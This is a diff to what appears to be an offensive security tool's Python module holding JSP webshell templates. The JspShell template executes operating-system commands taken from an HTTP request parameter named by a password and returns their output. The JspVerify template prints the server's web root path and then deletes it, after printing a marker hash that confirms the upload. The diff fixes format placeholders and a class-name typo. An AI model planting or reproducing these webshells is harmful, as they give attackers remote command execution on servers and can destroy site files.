@@ -10,7 +10,7 @@ class JspShell(Webshell):
                '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");\n' \
                'if (request.getParameter("{0}") != null)\n' \
                '{{\n' \
-               '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
+               '    Process p = Runtime.getRuntime().exec(request.getParameter("{1}"));\n' \
                '    OutputStream os = p.getOutputStream();\n' \
                '    InputStream in = p.getInputStream();\n' \
                '    DataInputStream dis = new DataInputStream(in);\n' \
@@ -26,17 +26,20 @@ class JspShell(Webshell):
     _check_data = {'check': '1'}
     _keyword = '202cb962ac59075b964b07152d234b70'
 
+    def get_content(self):
+        return self._content.format(self._password, self._password)
 
-class JspVeriry(VerifyShell):
+
+class JspVerify(VerifyShell):
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
                '<%@ page import="java.io.*"%>\n' \
                '<%\n' \
                'String path=request.getRealPath("");\n' \
                'out.println(path);\n' \
                'File d=new File(path);\n' \
-               'if(d.exists()){\n' \
+               'if(d.exists()){{\n' \
                '  d.delete();\n' \
-               '  }\n' \
+               '  }}\n' \
                '%>\n' \
                '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");%>'
     _keyword = '202cb962ac59075b964b07152d234b70'
